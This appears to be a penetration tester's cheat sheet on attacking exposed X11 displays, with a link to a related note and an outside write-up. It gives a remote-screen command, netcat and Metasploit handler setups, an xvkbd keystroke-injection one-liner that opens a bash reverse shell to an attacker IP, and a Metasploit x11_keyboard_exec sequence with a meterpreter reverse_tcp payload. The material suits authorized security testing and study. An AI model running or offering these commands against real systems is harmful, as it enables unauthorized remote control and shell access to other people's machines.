s# X11

## 01 - Manual

### 1.1 - Remote Screen

```
$ Xephyr -from <attacker_IP> -query <target_IP> -screen 800x600 :1
```

### 1.2 - Implant Callback

Launch a shell handler.

```
$ nc -lnvp <attacker_PORT>

$ sudo msfconsole -qx "use exploit/multi/handler; set payload cmd/unix/reverse_bash; set lhost <attacker_IP>; set lport <attacker_PORT>; run"
```

Execute the command with one-liner shell.

```
$ xvkbd -no-repeat -no-sync -no-jump-pointer -remote-display <target_IP>:1 -text "/bin/bash -i > /dev/tcp/<attacker_IP>/<attacker_PORT> <&1 2>&1\r"
```

## 02 - Metasploit

```
msf > use exploit/unix/x11/x11_keyboard_exec

msf exploit(unix/x11/x11_keyboard_exec) > set payload linux/x64/metepreter/reverse_tcp

msf exploit(unix/x11/x11_keyboard_exec) > options

msf exploit(unix/x11/x11_keyboard_exec) > set rhost <target_IP>

msf exploit(unix/x11/x11_keyboard_exec) > set lhost <attacker_IP>

msf exploit(unix/x11/x11_keyboard_exec) > set lport <attacker_PORT>

msf exploit(unix/x11/x11_keyboard_exec) > set time_wait 10

msf exploit(unix/x11/x11_keyboard_exec) > run
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/B - Vulnerability Assessment/01 - Vulnerable Network Protocols/Remote Services/X11|Vulnerability Assessment: Remote Services - X11]]

- [Bordergate: Pentesting X11](https://www.bordergate.co.uk/pentesting-x11/)